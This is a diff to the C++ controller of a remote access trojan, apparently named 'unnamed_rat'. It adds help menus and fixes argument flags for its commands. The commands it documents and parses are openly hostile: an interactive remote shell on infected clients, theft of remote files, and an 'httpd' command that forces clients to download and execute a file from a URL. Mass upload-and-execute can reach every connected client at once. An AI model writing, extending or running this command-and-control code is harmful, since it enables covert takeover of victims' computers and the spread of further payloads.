@@ -209,6 +209,10 @@ bool Server::DownloadFile(const std::string strRemoteFileName, int iClientID){
 }
 
 void Server::ParseClientCommand(std::string strCommand, int iClientID){
+	if(strCommand == "?" || strCommand == "help" || strCommand == "aiuda"){
+		Help(std::string("client"), Clients[iClientID]->strOS == "Linux" ? 1 : 0);
+		return;
+	}
 	std::vector<std::string> vcClientCommands;
 	Misc::strSplit(strCommand, ' ', vcClientCommands, 10);
 	if(vcClientCommands[0][0] == '!'){
@@ -322,7 +326,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					}
 				}
 			} else {
-				std::cout<<"\n\tUse info -b (Basic)  -f (Full)\n";
+				std::cout<<"\n\tUse info -b (Basic)\n";
 			}
 			mtxLock();
 			Clients[iClientID]->isFlag = false;
@@ -407,12 +411,18 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 				mtxLock();
 				Clients[iClientID]->isFlag = false;
 				mtxUnlock();
+			} else {
+				std::cout<<"\n\tUse httpd -u <url> -r <yes|no> (Execute)\n";
 			}
 		}
 	}
 }
 
 void Server::ParseMassiveCommand(std::string strCommand){
+	if(strCommand == "?" || strCommand == "help" || strCommand == "aiuda"){
+		Help(std::string("massive"),0);
+		return;
+	}
 	std::vector<std::string> vcMassiveCommands;
 	Misc::strSplit(strCommand, ' ', vcMassiveCommands, 10);
 	if(vcMassiveCommands[0][0] == '!'){
@@ -431,7 +441,7 @@ void Server::ParseMassiveCommand(std::string strCommand){
 				std::string strOS = "";
 				u_char cExec = '0'; //default if by any reason loop f***k it
 				for(u_int iIt=1; iIt<7; iIt+=2){
-					if(vcMassiveCommands[iIt] == "-f"){
+					if(vcMassiveCommands[iIt] == "-l"){
 						strLocalFile = vcMassiveCommands[iIt+1];
 						continue;
 					}
@@ -487,7 +497,7 @@ void Server::ParseMassiveCommand(std::string strCommand){
 					std::cout<<"Error parsing arguments\n";
 				}
 			} else {
-				std::cout<<"\n\tUse upload -f local_filename -r yes|no -o windows|linux|*\n";
+				std::cout<<"\n\tUse upload -l local_filename -r yes|no -o windows|linux|*\n";
 			}
 			return;
 		}
@@ -777,22 +787,23 @@ void Server::threadListener(){
 
 //here parse all commands from stdin
 void Server::threadMasterCMD(){
-	std::string strPrompt = "unamed_rat# ";
+	std::string strPrompt = "unnamed_rat# ";
+	std::string strCMD = "";
 	while(!bSignalFlag){
-		std::string strCMD;
+		strCMD.erase(strCMD.begin(), strCMD.end());
 		std::cout<<strPrompt;
 		std::getline(std::cin, strCMD);
-		if(strCMD.length() <= 1){
+		
+		if(strCMD.length() <= 0){
+			continue;
+		}
+		if(strCMD == "?" || strCMD == "help" || strCMD == "aiuda"){
+			Help(std::string("main"), 0);
 			continue;
 		}
 		std::vector<std::string> vcCommands;
 		Misc::strSplit(strCMD, ' ', vcCommands, 10);
 		
-		//help documentation goes here
-		if(vcCommands[0] == "?"){
-			std::cout<<"this is help, yes what else you was waiting for\n";
-			continue;
-		}
 		//run shell command
 		if(vcCommands[0][0] == '!'){
 			std::string strShellCommand = vcCommands[0].substr(1, vcCommands[0].length()-1);
@@ -946,6 +957,54 @@ void Server::threadRemoteCmdOutput(int iClientID){
 			std::cout<<"client doesnt exist or is not connected anymore\n";
 			break;
 		}
+	}
+}
+
+void Server::Help(const std::string strHelp, int iOS){
+	std::vector<std::string> vHeaders, vFields;
+	if(strHelp == "main"){
+		std::cout<<"cli - Command to interact with clients\n";
+		std::cout<<"Options:\n";
+		vHeaders.push_back("Parameter");
+		vHeaders.push_back("About");
+		vHeaders.push_back("Options");
+		vFields.push_back("-a,Action to run on selected client,interact / close");
+		vFields.push_back("-c,Client to run selected action,number / *");
+		Misc::PrintTable(vHeaders, vFields, ',');
+		std::cout<<"Ej:  cli -c 0 -a interact  <-- Start interactive session with client 0\n";
+		std::cout<<"     cli -c 0 -a close     <-- Close connection with client 0 and terminate remote process\n";
+		std::cout<<"     cli -c *              <-- Start interactive session with all connected clients\n";
+		return;
+	}
+	if(strHelp == "client"){
+		//shell info download upload httpd
+		//1 linux 0 windows
+		std::cout<<"Available commands\n";
+		vHeaders.push_back("Command");
+		vHeaders.push_back("About");
+		vHeaders.push_back("Parameters");
+		if(iOS == 1){
+			vFields.push_back("shell,Start interactive shell with client,-c /path/to/shell");
+			vFields.push_back("download,Download a remote file,-r /path/to/file");
+			vFields.push_back("upload,Upload a local file to client,-l /path/to/localfile,-r /path/remotefile");
+		} else {
+			vFields.push_back("shell,Start interactive shell with client,-c C:\\path\\to\\shell.exe");
+			vFields.push_back("download,Download a remote file,-r C:\\path\\to\\file.txt");
+			vFields.push_back("upload,Upload a local file to client,-l /path/to/localfile,-r C:\\remote\\filename");
+		}
+		vFields.push_back("httpd,Force client to download file from a http/https server,-u url,-r yes/no (Execute)");
+		vFields.push_back("info,Retrieve basic info from client,-f (Basic)");
+		Misc::PrintTable(vHeaders, vFields, ',');
+		return;
+	}
+	if(strHelp == "massive"){
+		vHeaders.push_back("Command");
+		vHeaders.push_back("About");
+		vHeaders.push_back("Parameters");
+		vFields.push_back("httpd,Force clients to download a file,-u url,-r yes/no,-o windows/linux/*");
+		vFields.push_back("upload,Send file to all clients,-l /path/to/file,-r yes/no (Execute),-o windows/linux/*");
+		Misc::PrintTable(vHeaders, vFields, ',');
+		return;
 	}
 }
 
